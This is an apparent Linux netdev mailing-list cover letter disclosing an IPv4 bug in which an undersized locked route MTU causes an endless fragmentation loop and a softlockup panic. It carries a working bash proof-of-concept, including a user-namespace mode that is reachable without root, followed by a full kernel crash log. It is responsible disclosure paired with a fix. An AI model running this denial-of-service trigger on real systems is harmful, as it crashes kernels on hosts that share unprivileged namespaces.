Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AC4D5305674
	for <netdev@vger.kernel.org>; Sat,  8 Aug 2026 08:01:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786176086; cv=none; b=Scg8yvBYgdl9aS4pJsVW/KvOk7Nlv3lPFlE6z4qsbLaBz/ZnPy9N0YxUHJ20nDdJsTeTurc7TkPGdX3QNAY88i7MjC6xNmGBHtFMR0QAZ/wLksmSGqgiM+khSWBxJhZIq0P8QbFmRzUm8PzR+emk9FFeLrp0XIRq1LL3NeBy6lI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786176086; c=relaxed/simple;
	bh=fA2FsXfDtQfbgHtZcShdrbcE/vpnfS7zpepH2FHuzS4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=C9wdqL+CrZiv+31myAegPvVwKHEtbN9Ck4Bt/Bw47Clfrcayg60aiK3kHpSC6R5WR7rQIdjmUAaAtRqtb8dN6tV4EtVp5s6FwlnDKOjJSip62xZM20pK5XT/gcjyQDzYCtXRtdEKZuDvYIcNSUI3i9jjjvfVDDpnQx7e1Cl+WDU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=kKpIaf1f; arc=none smtp.client-ip=209.85.214.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="kKpIaf1f"
Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2cacf197759so5875805ad.2
        for <netdev@vger.kernel.org>; Sat, 08 Aug 2026 01:01:24 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786176084; x=1786780884; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=dH26b65cJzvMKGGtw8pTMW6JQMEOrdSV+6RWevu+u1U=;
        b=kKpIaf1fDP8BD7uJKXSbSDLUHRGoYs05NRWA+ZfEOIuccPZ7zh1P7rmDkaE29i+w0Y
         acEqsEWgLpopX5+aVaKjHqLFQ/TgkmLi9tk1gl0PlEq53BrcgrVDDUuwESsbYRhUEZUh
         qOnJpwhUx+SxtKhgX8MGDCiGDwRDGRLU0CCrz6WgDmvdWO9HXyLTOK0r1Y4PC+faKBL8
         0pFE4ugo/V7vylPFrjo5fkDRKoI6JV0uWgiznBNAk0bZl1b2nPJNlQ/Q+/QLhbzQA0fk
         MSNDiM5FDSsqowzDwuDWZ1dGj59KS418I0JfcwmLM3In2tG2XzPOtChDQnStAYGDlIgr
         LVFA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786176084; x=1786780884;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=dH26b65cJzvMKGGtw8pTMW6JQMEOrdSV+6RWevu+u1U=;
        b=ZNXE7Ooaob8ioZ1LLbF4lMWC1z491FcP5wKyR3hgFnW3YtXge7rtyrZFAcan0TdACO
         uUYIyRgD8352MOC6jB2tvUDTQZN7Lwrw1dffFqQhf3k5PUXCjqg0/NuO7d7lAgOpVSgH
         v7esdRw3ZacNGx6ZAW9nqoDasuB3OSRbPf5Q4AkSh+I2rOzQV983s4rz/kvIT4gTaLgL
         3Eu2uRpv1ba7poTM1WZFW1J8oOjsa4rr9wse3f7vE2t2QEftYRVJhUQNy+wbRH/EknDS
         CjNnvsJL3wnHRT54/Uo8VVSIrYX/dYviSypt7KvFKk5+X+DvdSLKmdCGhjRcNA416gia
         fYEA==
X-Gm-Message-State: AOJu0YyYIloMOOAv7b6hTuJjFROHSGyZCzGT5N9yTIVtY3kvx1zLc5SR
	1tQpMa1+WUex6Z5W+sgqLwMOcwa0HrAkz1bU/Y2NUwMx6Z5iJzN98TGo3uqdpx4wgnqPR3l1JeF
	kfyq/PrxU
X-Gm-Gg: AR+sD131DpF55Y5N0kI49G/rucggz4fOfYFHmjiaao3yZv8EvdQrnBp/O2pElTBhkmL
	y0jXHLtWiAn95t1o9jglcMhvNml3GufzVZSHNG2wBSVX36QSbTRD1YHkCIkp7woJd6bX9mV5EcK
	+YbEuHYgflZI0CF1qR5QtfPorSCvOiXLzDb8CwnMjSr0LkKcyd67aciRXBnl3eS09kH+48zbY3S
	gJIrNu4Aow+DGDrS6KVaNAHHv42JtRlNLr9jRb1tquxt8iO/1oiNSm76Bkz6lQa9JgixDJdxUIG
	G92k3fEnZxB5A/kWf32ZahOcyJsrUly+jFubFRV2VPqFkcJl9e1KfGH9gjMYvUGub/B/+7ETFkF
	i9n1fXYcFNMRr6nBl/sQh1xvDwubmQPtyHF/vBW9L6+nr35WFup/p04m6+HkAe0E7z4GSihvqyN
	DcvR5XjNZVPIdIAlRhxyt6tfSWssTqpsOX1rWdSswp2VXK/JTvNG9vGWNaFsYZWHcONSQMQg==
X-Received: by 2002:a17:903:4688:b0:2ce:fa3a:45f7 with SMTP id d9443c01a7336-2d294c490d6mr105719515ad.16.1786176083579;
        Sat, 08 Aug 2026 01:01:23 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d16c4a773esm16766705ad.65.2026.08.08.01.01.16
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 08 Aug 2026 01:01:23 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	edragain@163.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] ipv4: fix a non-progressing fragmentation loop from undersized RTAX_MTU
Date: Sat,  8 Aug 2026 16:01:14 +0800
Message-ID: <cover.1786094799.git.edragain@163.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Yong Wang <edragain@163.com>

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/metrics.c. The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ip_metrics_convert() accepts arbitrarily small non-zero RTAX_MTU
values from userspace. A route installed with "mtu lock 20" therefore
stores an MTU that is below the IPv4 minimum MTU.

This route metric is later used on the IPv4 forwarding fragmentation
path. ip_skb_dst_mtu() returns the route MTU, and ip_do_fragment()
subtracts the IPv4 header length from it. With a normal 20-byte IPv4
header and RTAX_MTU=20, the resulting payload MTU becomes zero.

ip_frag_next() clamps the fragment length to state->mtu and then aligns
it down to an 8-byte boundary. When state->mtu is zero, the fragment
length remains zero, so state->left, state->offset and state->ptr never
advance. ip_do_fragment() therefore keeps allocating and transmitting
header-only fragments in a non-progressing loop until the softlockup
detector fires.

The bug is reachable through the IPv4 route netlink interface. A user
with CAP_NET_ADMIN in a user-created network namespace can install the
undersized locked MTU route and then inject or forward a non-DF IPv4
packet through it to trigger the loop.

Reproducer:

Run inside the guest as root:

    bash poc.sh root

The PoC sets up forwarding through dummy0 with a locked MTU of 20 and
injects one forwarded non-DF ping from a child netns.

Expected result:

    watchdog: BUG: soft lockup - CPU#... stuck ... [ping:...]

with ip_frag_next() and ip_do_fragment() in the panic stack.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#!/bin/bash
set -euo pipefail

MODE="${1:-root}"

OUT_NET="10.23.45.0/24"
OUT_ADDR="10.23.45.1/24"
OUT_SRC="${OUT_ADDR%/*}"
OUT_DST="10.23.45.2"
IN_ADDR="192.0.2.1/24"
IN_SRC="${IN_ADDR%/*}"
CHILD_ADDR="192.0.2.2/24"
CHILD_SRC="${CHILD_ADDR%/*}"
ROUTE_MTU="${ROUTE_MTU:-20}"
PING_SIZE="${PING_SIZE:-100}"

usage() {
	echo "usage: $0 {root|userns}" >&2
	exit 1
}

setup_forwarder() {
	ip link set lo up
	echo 1 > /proc/sys/net/ipv4/ip_forward

	ip link del veth0 2>/dev/null || true
	ip link add dummy0 type dummy 2>/dev/null || true

	ip link set dummy0 down 2>/dev/null || true
	ip addr flush dev dummy0 2>/dev/null || true

	ip link add veth0 type veth peer name veth1
	ip addr add "$IN_ADDR" dev veth0
	ip link set veth0 up

	ip link set dummy0 up
	ip addr add "$OUT_ADDR" dev dummy0
	ip route replace "$OUT_NET" dev dummy0 proto static scope link \
		src "$OUT_SRC" mtu lock "$ROUTE_MTU"
}

trigger_forwarded_ping() {
	unshare -n -- bash -c 'sleep 1000' &
	child=$!
	sleep 0.2

	ip link set veth1 netns "$child"
	nsenter -t "$child" -n ip link set lo up
	nsenter -t "$child" -n ip addr add "$CHILD_ADDR" dev veth1
	nsenter -t "$child" -n ip link set veth1 up
	nsenter -t "$child" -n ip route add default via "$IN_SRC"

	ip route get "$OUT_DST" from "$CHILD_SRC" iif veth0
	nsenter -t "$child" -n ping -M dont -s "$PING_SIZE" -c 1 -W 1 "$OUT_DST"
}

run_root() {
	sysctl -w kernel.panic_on_warn=0 \
		kernel.softlockup_panic=1 \
		kernel.watchdog_thresh=1 >/dev/null
	setup_forwarder
	trigger_forwarded_ping
}

run_inner_userns() {
	setup_forwarder
	trigger_forwarded_ping
}

run_userns() {
	exec unshare -Urn -- bash "$0" _inner_userns
}

case "$MODE" in
root)
	run_root
	;;
userns)
	run_userns
	;;
_inner_userns)
	run_inner_userns
	;;
*)
	usage
	;;
esac

------END poc.c--------

----BEGIN crash log----

[   49.620188] watchdog: BUG: soft lockup - CPU#2 stuck for 4s! [ping:892]
[   49.620193] Modules linked in:
[   49.620197] CPU: 2 UID: 0 PID: 892 Comm: ping Not tainted 6.12.95 #1
[   49.620200] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   49.620202] RIP: 0010:unwind_next_frame+0x71/0x830
[   49.620233] Code: 58 80 7b 41 01 48 83 df 00 48 85 ff 0f 84 6f 01 00 00 e8 12 fd ff ff 48 89 c5 48 85 c0 0f 84 a7 01 00 00 0f b6 45 05 83 e0 07 <0f> 84 32 01 00 00 3c 01 0f 84 2e 01 00 00 0f b6 45 05 c0 e8 03 83
[   49.620234] RSP: 0018:ffffc9000013c8d8 EFLAGS: 00000202
[   49.620237] RAX: 0000000000000002 RBX: ffffc9000013c918 RCX: ffffffff8244b4ef
[   49.620238] RDX: 0000000000000012 RSI: ffffffff84b91d34 RDI: ffffffff84b91d30
[   49.620239] RBP: ffffffff84fd2f1c R08: ffffffff8244b4fe R09: ffffffff84b91d18
[   49.620241] R10: 0000000000000006 R11: 00000000000144b4 R12: 0000000000000001
[   49.620242] R13: ffffffff8244b4ff R14: ffffc900012b7b88 R15: ffff888103790040
[   49.620245] FS:  00007c32225c1380(0000) GS:ffff88813bd00000(0000) knlGS:0000000000000000
[   49.620247] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   49.620248] CR2: 00007ffc35a21c80 CR3: 0000000105e58005 CR4: 0000000000770ef0
[   49.620251] PKRU: 55555554
[   49.620252] Call Trace:
[   49.620253]  <IRQ>
[   49.620255]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[   49.620260]  arch_stack_walk+0x9a/0x100
[   49.620264]  ? neigh_resolve_output+0x12f/0x1b0
[   49.620269]  stack_trace_save+0x4e/0x70
[   49.620271]  set_track_prepare+0x43/0x80
[   49.620275]  ? dummy_xmit+0x3f/0x70
[   49.620279]  ? dev_hard_start_xmit+0xca/0x1e0
[   49.620282]  ? __dev_queue_xmit+0x7c1/0xe60
[   49.620284]  ? ip_finish_output2+0x268/0x540
[   49.620287]  ? ip_do_fragment+0x229/0x560
[   49.620290]  ? ip_output+0x5d/0xe0
[   49.620292]  ? __netif_receive_skb_one_core+0x89/0xa0
[   49.620294]  ? process_backlog+0x99/0x1b0
[   49.620296]  ? __napi_poll+0x28/0x1b0
[   49.620298]  ? net_rx_action+0x197/0x370
[   49.620300]  ? handle_softirqs+0xe6/0x300
[   49.620303]  ? do_softirq.part.0+0x3b/0x60
[   49.620305]  ? __local_bh_enable_ip+0x4f/0x60
[   49.620307]  ? __neigh_event_send+0xb9/0x390
[   49.620310]  ? neigh_resolve_output+0x12f/0x1b0
[   49.620312]  free_to_partial_list+0x2ae/0x590
[   49.620315]  ? dummy_xmit+0x3f/0x70
[   49.620318]  ? dummy_xmit+0x3f/0x70
[   49.620320]  kmem_cache_free+0x265/0x400
[   49.620322]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.620326]  ? skb_release_data+0x166/0x1c0
[   49.620330]  dummy_xmit+0x3f/0x70
[   49.620332]  dev_hard_start_xmit+0xca/0x1e0
[   49.620335]  __dev_queue_xmit+0x7c1/0xe60
[   49.620337]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.620340]  ? kmem_cache_alloc_node_noprof+0x17a/0x2b0
[   49.620342]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.620345]  ? kmalloc_reserve+0x93/0x100
[   49.620348]  ip_finish_output2+0x268/0x540
[   49.620351]  ip_do_fragment+0x229/0x560
[   49.620354]  ? __pfx_ip_finish_output2+0x10/0x10
[   49.620358]  ip_output+0x5d/0xe0
[   49.620361]  ? __pfx_ip_finish_output+0x10/0x10
[   49.620364]  __netif_receive_skb_one_core+0x89/0xa0
[   49.620366]  process_backlog+0x99/0x1b0
[   49.620369]  __napi_poll+0x28/0x1b0
[   49.620372]  net_rx_action+0x197/0x370
[   49.620377]  handle_softirqs+0xe6/0x300
[   49.620380]  do_softirq.part.0+0x3b/0x60
[   49.620382]  </IRQ>
[   49.620382]  <TASK>
[   49.620383]  __local_bh_enable_ip+0x4f/0x60
[   49.620385]  __neigh_event_send+0xb9/0x390
[   49.620389]  neigh_resolve_output+0x12f/0x1b0
[   49.620391]  ip_finish_output2+0x185/0x540
[   49.620394]  ip_output+0x5d/0xe0
[   49.620396]  ? __pfx_ip_finish_output+0x10/0x10
[   49.620399]  ip_push_pending_frames+0xa5/0xb0
[   49.620402]  raw_sendmsg+0x837/0x1220
[   49.620406]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.620408]  ? __alloc_pages_noprof+0x160/0x380
[   49.620411]  ? __mod_memcg_lruvec_state+0xd8/0x1d0
[   49.620418]  ? __sys_sendto+0x1df/0x1f0
[   49.620421]  __sys_sendto+0x1df/0x1f0
[   49.620427]  __x64_sys_sendto+0x24/0x30
[   49.620430]  do_syscall_64+0x58/0x120
[   49.620434]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   49.620437] RIP: 0033:0x7c3222839687
[   49.620440] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[   49.620441] RSP: 002b:00007ffc35a22670 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[   49.620443] RAX: ffffffffffffffda RBX: 00007c32225c1380 RCX: 00007c3222839687
[   49.620444] RDX: 000000000000006c RSI: 000055a98774a364 RDI: 0000000000000003
[   49.620445] RBP: 000055a98774a364 R08: 000055a98775c5d8 R09: 0000000000000010
[   49.620446] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000000006c
[   49.620447] R13: 00007ffc35a23db0 R14: 000055a98774a364 R15: 0000001d00000001
[   49.620451]  </TASK>
[   49.620453] Kernel panic - not syncing: softlockup: hung tasks
[   49.651245] CPU: 2 UID: 0 PID: 892 Comm: ping Tainted: G             L     6.12.95 #1
[   49.651777] Tainted: [L]=SOFTLOCKUP
[   49.652014] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   49.652782] Call Trace:
[   49.652961]  <IRQ>
[   49.653107]  panic+0x352/0x3e0
[   49.653322]  watchdog_timer_fn+0x21b/0x260
[   49.653604]  ? __pfx_watchdog_timer_fn+0x10/0x10
[   49.653940]  __hrtimer_run_queues+0x11b/0x280
[   49.654242]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.654568]  hrtimer_interrupt+0xfa/0x230
[   49.654864]  __sysvec_apic_timer_interrupt+0x5a/0xf0
[   49.655200]  sysvec_apic_timer_interrupt+0x38/0x90
[   49.655529]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[   49.655894] RIP: 0010:unwind_next_frame+0x71/0x830
[   49.656218] Code: 58 80 7b 41 01 48 83 df 00 48 85 ff 0f 84 6f 01 00 00 e8 12 fd ff ff 48 89 c5 48 85 c0 0f 84 a7 01 00 00 0f b6 45 05 83 e0 07 <0f> 84 32 01 00 00 3c 01 0f 84 2e 01 00 00 0f b6 45 05 c0 e8 03 83
[   49.657450] RSP: 0018:ffffc9000013c8d8 EFLAGS: 00000202
[   49.657821] RAX: 0000000000000002 RBX: ffffc9000013c918 RCX: ffffffff8244b4ef
[   49.658303] RDX: 0000000000000012 RSI: ffffffff84b91d34 RDI: ffffffff84b91d30
[   49.658790] RBP: ffffffff84fd2f1c R08: ffffffff8244b4fe R09: ffffffff84b91d18
[   49.659276] R10: 0000000000000006 R11: 00000000000144b4 R12: 0000000000000001
[   49.659764] R13: ffffffff8244b4ff R14: ffffc900012b7b88 R15: ffff888103790040
[   49.660242]  ? neigh_resolve_output+0x12f/0x1b0
[   49.660554]  ? neigh_resolve_output+0x12e/0x1b0
[   49.660870]  ? neigh_resolve_output+0x11f/0x1b0
[   49.661178]  ? unwind_next_frame+0x5e/0x830
[   49.661463]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[   49.661829]  arch_stack_walk+0x9a/0x100
[   49.662116]  ? neigh_resolve_output+0x12f/0x1b0
[   49.662435]  stack_trace_save+0x4e/0x70
[   49.662699]  set_track_prepare+0x43/0x80
[   49.662996]  ? dummy_xmit+0x3f/0x70
[   49.663236]  ? dev_hard_start_xmit+0xca/0x1e0
[   49.663572]  ? __dev_queue_xmit+0x7c1/0xe60
[   49.663877]  ? ip_finish_output2+0x268/0x540
[   49.664168]  ? ip_do_fragment+0x229/0x560
[   49.664444]  ? ip_output+0x5d/0xe0
[   49.664681]  ? __netif_receive_skb_one_core+0x89/0xa0
[   49.665036]  ? process_backlog+0x99/0x1b0
[   49.665310]  ? __napi_poll+0x28/0x1b0
[   49.665560]  ? net_rx_action+0x197/0x370
[   49.665838]  ? handle_softirqs+0xe6/0x300
[   49.666122]  ? do_softirq.part.0+0x3b/0x60
[   49.666398]  ? __local_bh_enable_ip+0x4f/0x60
[   49.666695]  ? __neigh_event_send+0xb9/0x390
[   49.667002]  ? neigh_resolve_output+0x12f/0x1b0
[   49.667312]  free_to_partial_list+0x2ae/0x590
[   49.667610]  ? dummy_xmit+0x3f/0x70
[   49.667868]  ? dummy_xmit+0x3f/0x70
[   49.668113]  kmem_cache_free+0x265/0x400
[   49.668380]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.668710]  ? skb_release_data+0x166/0x1c0
[   49.669007]  dummy_xmit+0x3f/0x70
[   49.669242]  dev_hard_start_xmit+0xca/0x1e0
[   49.669535]  __dev_queue_xmit+0x7c1/0xe60
[   49.669829]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.670166]  ? kmem_cache_alloc_node_noprof+0x17a/0x2b0
[   49.670519]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.670864]  ? kmalloc_reserve+0x93/0x100
[   49.671140]  ip_finish_output2+0x268/0x540
[   49.671422]  ip_do_fragment+0x229/0x560
[   49.671686]  ? __pfx_ip_finish_output2+0x10/0x10
[   49.672012]  ip_output+0x5d/0xe0
[   49.672238]  ? __pfx_ip_finish_output+0x10/0x10
[   49.672543]  __netif_receive_skb_one_core+0x89/0xa0
[   49.672888]  process_backlog+0x99/0x1b0
[   49.673155]  __napi_poll+0x28/0x1b0
[   49.673395]  net_rx_action+0x197/0x370
[   49.673660]  handle_softirqs+0xe6/0x300
[   49.673938]  do_softirq.part.0+0x3b/0x60
[   49.674208]  </IRQ>
[   49.674361]  <TASK>
[   49.674512]  __local_bh_enable_ip+0x4f/0x60
[   49.674809]  __neigh_event_send+0xb9/0x390
[   49.675096]  neigh_resolve_output+0x12f/0x1b0
[   49.675392]  ip_finish_output2+0x185/0x540
[   49.675672]  ip_output+0x5d/0xe0
[   49.675908]  ? __pfx_ip_finish_output+0x10/0x10
[   49.676219]  ip_push_pending_frames+0xa5/0xb0
[   49.676515]  raw_sendmsg+0x837/0x1220
[   49.676781]  ? srso_alias_return_thunk+0x5/0xfbef5
[   49.677108]  ? __alloc_pages_noprof+0x160/0x380
[   49.677421]  ? __mod_memcg_lruvec_state+0xd8/0x1d0
[   49.677758]  ? __sys_sendto+0x1df/0x1f0
[   49.678031]  __sys_sendto+0x1df/0x1f0
[   49.678290]  __x64_sys_sendto+0x24/0x30
[   49.678556]  do_syscall_64+0x58/0x120
[   49.678819]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   49.679164] RIP: 0033:0x7c3222839687
[   49.679410] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[   49.680660] RSP: 002b:00007ffc35a22670 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[   49.681187] RAX: ffffffffffffffda RBX: 00007c32225c1380 RCX: 00007c3222839687
[   49.681663] RDX: 000000000000006c RSI: 000055a98774a364 RDI: 0000000000000003
[   49.682158] RBP: 000055a98774a364 R08: 000055a98775c5d8 R09: 0000000000000010
[   49.682640] R10: 0000000000000000 R11: 0000000000000202 R12: 000000000000006c
[   49.683157] R13: 00007ffc35a23db0 R14: 000055a98774a364 R15: 0000001d00000001
[   49.683641]  </TASK>
[   49.684119] Kernel Offset: disabled

-----END crash log-----

Best regards,
Yong Wang


Yong Wang (1):
  ipv4: reject RTAX_MTU values below IPV4_MIN_MTU

 net/ipv4/metrics.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.53.0

